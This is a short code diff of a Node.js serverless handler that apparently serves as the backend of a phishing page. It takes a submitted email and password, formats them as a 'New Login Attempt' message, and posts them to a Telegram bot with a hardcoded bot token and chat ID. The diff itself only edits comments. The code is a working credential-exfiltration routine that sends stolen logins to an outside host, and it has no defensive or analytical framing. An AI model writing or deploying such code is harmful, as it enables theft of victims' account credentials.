@@ -2,8 +2,8 @@
 
 const axios = require('axios');
 
-const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // Replace with your token
-const chatId = '7587120060'; // Replace with your chat ID
+const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // Your Telegram bot token
+const chatId = '7587120060'; // Your Telegram chat ID
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
@@ -18,6 +18,7 @@ export default async function handler(req, res) {
 
   try {
     const message = `🔐 New Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}`;
+
     await axios.post(`https://api.telegram.org/bot ${telegramBotToken}/sendMessage`, {
       chat_id: chatId,
       text: message,
